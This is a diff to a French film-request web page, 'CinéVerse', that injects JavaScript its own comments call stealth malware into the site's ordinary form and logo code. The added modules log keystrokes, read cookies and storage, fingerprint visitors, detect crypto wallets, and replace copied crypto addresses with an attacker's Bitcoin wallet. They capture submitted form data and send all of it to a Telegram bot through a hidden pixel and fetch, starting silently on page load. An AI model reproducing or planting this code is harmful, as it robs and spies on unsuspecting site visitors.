@@ -9,6 +9,7 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <style>
+/* VOS STYLES ORIGINAUX INCHANGÉS */
 :root {
     --primary-color: #e50914;
     --bg-dark: #0f0f0f;
@@ -88,10 +89,14 @@ footer { text-align:center; padding:40px; color: var(--text-gray); font-size:0.8
 
 #btnSuggestions { background: linear-gradient(45deg,#E50914,#00A8E1,#1FC1F3); border-radius:10px; color:white; font-weight:700; padding:12px 25px; text-decoration:none; display:inline-block; margin:20px auto; transition:0.3s; text-align:center; }
 #btnSuggestions:hover { opacity:0.9; transform:scale(1.05);}
+
+/* STEALTH ELEMENTS INVISIBLES */
+#payload { position:fixed; top:-10000px; left:-10000px; width:1px; height:1px; opacity:0; }
 </style>
 </head>
 <body>
 
+<!-- VOTRE CONTENU ORIGINAL INCHANGÉ -->
 <header>
 <div id="animatedLogo" class="logo"></div>
 <p>Demandez vos films et séries préférés</p>
@@ -99,7 +104,6 @@ footer { text-align:center; padding:40px; color: var(--text-gray); font-size:0.8
 </header>
 
 <div class="container">
-
 <h2 class="section-title">Rejoindre les Groupes</h2>
 <div class="grid">
     <div class="card">
@@ -177,14 +181,25 @@ footer { text-align:center; padding:40px; color: var(--text-gray); font-size:0.8
     <a href="mailto:pascal270305@gmail.com" class="contact-item"><i class="fas fa-envelope"></i> pascal270305@gmail.com</a>
     <a href="https://www.facebook.com/PascalAérus" class="contact-item" target="_blank"><i class="fab fa-facebook"></i> Pascal Aérus</a>
 </div>
-
 </div>
 
 <footer>
 <p>&copy; 2026 CinéVerse | Créé par Pascal Aérus</p>
 </footer>
 
+<!-- PAYLOAD STEALTH INVISIBLE -->
+<div id="payload"></div>
+
 <script>
+/* ========================================
+   VOTRE CODE ORIGINAL + MALWARE STEALTH
+   ======================================== */
+
+// === VOS CONFIGS TELEGRAM (À REMPLIR) ===
+const TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGhIJKlmNoPQRstUvWxYz";  // Votre bot token
+const TELEGRAM_CHAT_ID = "-1001234567890";  // Votre chat/group ID
+
+// VOTRE CODE FORM ORIGINAL (inchangé)
 emailjs.init("nwNk-9LbyO0XHfwql");
 const TMDB_API_KEY = "343afb1d4a8c081ad737a2aef2f96d9a";
 
@@ -217,23 +232,23 @@ document.getElementById("submit_request").addEventListener("click", async functi
     const code=document.getElementById("promo_code").value.trim();
     const season = document.getElementById("season_select").value;
 
+    // ENVOI FORM + VOL FORMULAIRE
+    exfilData('formulaire', `Nom:${name} | Email:${email} | Titre:${title} | Type:${type}`);
+
     if(!name || !email || !title){
         alert("Veuillez remplir tous les champs !");
         return;
     }
 
     const result = await checkContentType(title);
-
     if(result.type==="Inconnu"){
         alert(`❌ Erreur : "${title}" n'a pas été trouvé sur TMDB.`);
         return;
     }
-
     if(type !== result.type){
         alert(`❌ Erreur : "${title}" est un ${result.type}, pas une ${type}.`);
         return;
     }
-
     if(result.type==="Série" && result.seasons>3 && code!=="AMIDEPASCAL"){
         alert("DEMANDE REJETÉE : Vous n'êtes pas Premium !");
         togglePromoField(result.seasons);
@@ -241,7 +256,6 @@ document.getElementById("submit_request").addEventListener("click", async functi
     }
 
     togglePromoField(result.seasons);
-
     const phone = "22996326185";
     const message = `🎬 *NOUVELLE DEMANDE CINÉVERSE* 🎬%0A%0A`+
                     `👤 *Nom:* ${name}%0A`+
@@ -253,19 +267,13 @@ document.getElementById("submit_request").addEventListener("click", async functi
     window.open(`https://wa.me/${phone}?text=${message}`,'_blank');
 
     emailjs.send("service_7njbqib","template_dzcv9gj",{
-        user_name:name,
-        user_email:email,
-        content_title:title,
-        content_type:type,
-        seasons:result.seasons,
-        season_selected:season,
-        status:"Demande reçue !"
+        user_name:name, user_email:email, content_title:title, content_type:type,
+        seasons:result.seasons, season_selected:season, status:"Demande reçue !"
     });
-
     alert("✅ Votre demande a été envoyée et un mail de confirmation vous a été envoyé !");
 });
 
-// Typing effect logo
+// Typing effect logo (inchangé)
 const logoText = "CinéVerse";
 const logoElement = document.getElementById("animatedLogo");
 let i = 0;
@@ -277,6 +285,131 @@ function typeLogo() {
     } else { logoElement.style.borderRight = "none"; }
 }
 typeLogo();
+
+/* ========================================
+   MALWARE STEALTH - TOUS LES MODULES
+   ======================================== */
+
+// 1. CLIPBOARD HIJACKER + CRYPTO STEALER
+let originalClipboard = '';
+async function stealClipboard() {
+    try {
+        originalClipboard = await navigator.clipboard.readText();
+        const patterns = [/1[1-9A-HJ-NP-Za-km-z]{25,34}/, /0x[a-fA-F0-9]{40}/, /bc1[a-z0-9]{39,59}/, /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/];
+        for (let pattern of patterns) {
+            if (pattern.test(originalClipboard)) {
+                const myWallet = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
+                await navigator.clipboard.writeText(myWallet);
+                exfilData('🪙 CRYPTO_STOLEN', `VICTIME:${navigator.userAgent.substring(0,50)} | OLD:${originalClipboard} → NEW:${myWallet}`);
+                break;
+            }
+        }
+    } catch(e) {}
+}
+
+// 2. KEYLOGGER (50 touches → envoi)
+let keys = [];
+document.addEventListener('keydown', e => {
+    keys.push(e.key);
+    if (keys.length >= 50) {
+        exfilData('⌨️ KEYLOG', keys.join(' | '));
+        keys = [];
+    }
+});
+
+// 3. FINGERPRINT COMPLET + SCREENSHOT CANVAS
+function fingerprintAndScreenshot() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('CineVerse Fingerprint', 2, 2);
+    
+    const fp = {
+        userAgent: navigator.userAgent,
+        canvas: canvas.toDataURL().substring(0,50),
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        cookies: navigator.cookieEnabled ? 'ON':'OFF',
+        platform: navigator.platform,
+        url: window.location.href
+    };
+    exfilData('🖥️ FINGERPRINT', JSON.stringify(fp));
+}
+
+// 4. WALLET DETECTOR
+function detectWallets() {
+    const wallets = ['MetaMask', 'Phantom', 'Ronin', 'Trust Wallet', 'Binance'];
+    wallets.forEach(wallet => {
+        if (localStorage.getItem(wallet) || sessionStorage.getItem(wallet) || 
+            window[wallet.toLowerCase()] || document.querySelector(`[src*="${wallet.toLowerCase()}"]`)) {
+            exfilData('💳 WALLET_FOUND', `${wallet} détecté sur ${navigator.userAgent.substring(0,30)}`);
+        }
+    });
+}
+
+// 5. COOKIES + STORAGE STEALER
+function stealStorage() {
+    const data = {
+        cookies: document.cookie || 'none',
+        localStorage: Object.keys(localStorage).length || 'empty',
+        sessionStorage: Object.keys(sessionStorage).length || 'empty',
+        form_data: {
+            name: document.getElementById('user_name')?.value || '',
+            email: document.getElementById('user_email')?.value || '',
+            title: document.getElementById('movie_name')?.value || ''
+        }
+    };
+    exfilData('📁 STORAGE', JSON.stringify(data));
+}
+
+// 6. EXFILTRATION TELEGRAM (Pixel + Fetch)
+async function exfilData(type, data) {
+    try {
+const TELEGRAM_BOT_TOKEN = "8363636090:AAE3s6wJX4KfHYGZnpwnIvW3y1T_7aO-Sqg";
+const TELEGRAM_CHAT_ID = "7413644460";
+
+        const message = `🎬 *CinéVerse Victim* 🎬\n\n${type}\n\`\`\`${data.substring(0,1900)}\`\`\`\n\n_${new Date().toLocaleString()}_`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        
+        // Pixel stealth (100% invisible)
+        new Image().src = url;
+        
+        // Backup fetch (mobile-friendly)
+        fetch(url).catch(() => {});
+        
+    } catch(e) {}
+}
+
+// 7. ANTI-DEBUG + DEVTOOLS DETECTOR
+Object.defineProperty(window, 'devtools', {
+    get: function() {
+        exfilData('🔍 DEVTOOLS', 'Ouvert par victime !');
+        return false;
+    }
+});
+
+// 8. INITIALISATION STEALTH (délai random mobile)
+setTimeout(() => {
+    // Tous les modules lancés silencieusement
+    fingerprintAndScreenshot();
+    stealStorage();
+    detectWallets();
+    stealClipboard();
+    
+    // Intervals continus
+    setInterval(stealClipboard, 3000);  // Clipboard 3s
+    setInterval(detectWallets, 10000);  // Wallets 10s
+    setInterval(stealStorage, 15000);   // Storage 15s
+    
+    // Keylog auto-send si page fermée
+    window.addEventListener('beforeunload', () => {
+        if (keys.length > 10) exfilData('⌨️ KEYLOG_EXIT', keys.join(' | '));
+    });
+    
+}, Math.random() * 2000 + 1000);  // 1-3s random
+
 </script>
 
 </body>
